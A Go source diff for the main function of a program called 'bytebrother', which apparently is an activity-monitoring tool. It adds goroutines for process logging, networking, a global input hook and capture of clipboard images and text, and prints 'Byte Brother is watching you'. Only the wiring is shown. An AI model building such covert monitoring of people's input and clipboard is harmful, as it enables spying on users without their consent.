@@ -3,6 +3,7 @@ package main
 import (
 	a "bytebrother/main/archive"
 	bt "bytebrother/main/bigtime"
+	cp "bytebrother/main/clipboard"
 	fl "bytebrother/main/filer"
 	h "bytebrother/main/hook"
 	nt "bytebrother/main/network"
@@ -51,8 +52,10 @@ func main() {
 		}
 	}
 
-	go func() {
+	f.Println("Byte Brother is watching you")
 
+	// PROCESS
+	go func() {
 		for {
 			if nt.ChosenIndex != 69420 {
 
@@ -70,6 +73,7 @@ func main() {
 		}
 	}()
 
+	// PROCESS SAVING
 	go func() {
 		for {
 			if nt.ChosenIndex != 69420 {
@@ -79,12 +83,24 @@ func main() {
 		}
 	}()
 
+	// NETWORK
 	go func() {
 		nt.Start()
 	}()
 
+	// GLOBAL HOOK
 	go func() {
 		h.StartHook()
+	}()
+
+	// CLIPBOARD Image
+	go func() {
+		cp.Image()
+	}()
+
+	// CLIPBOARD Text
+	go func() {
+		cp.Text()
 	}()
 
 	select {}
